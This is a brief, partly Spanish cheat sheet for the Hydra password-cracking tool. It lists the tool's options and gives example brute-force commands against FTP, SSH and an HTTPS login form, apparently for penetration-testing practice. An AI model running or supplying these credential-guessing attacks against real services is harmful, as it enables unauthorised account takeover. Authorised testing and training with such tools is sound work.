# Hydra Cheat Sheet

### Options

- `-s <port>` : Si el servicio está en un puerto diferente por default.
- `-l` : Especificar un usuario.
- `-L <userfile>` : Leer de un archivo listado de usuarios.
- `-p` : Especificar un password.
- `-P <passwordfile>` : Leer de un archivo listado de passwords.
- `-t <#tasks>`: Número de conecciones en paralelo por objetivo.
- `-M <targetsfile>` : Leer de un archivo listado de objetivos.
- `-o <file>` : Guargar el resultado en un archivo.
- `-vV` : Modo verbose, mostrando el inicio de sesión+contraseña para cada intento

## Examples

### Brute Force Crack on FTP Server
- `hydra -t 1 -l admin -P <path-to-password.lst> -vV <IPaddress> ftp`

### Brute Force Crack on SSH Server
- `hydra -l msfadmin -P <path-to-password.lst> ssh://IPaddress -vV`

### Brute Force Crack on WEB Login Server
- `hydra -l none -P <path-to-password.lst> <IPaddress> https-form-post "/db/index.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect password" -t 64 -V`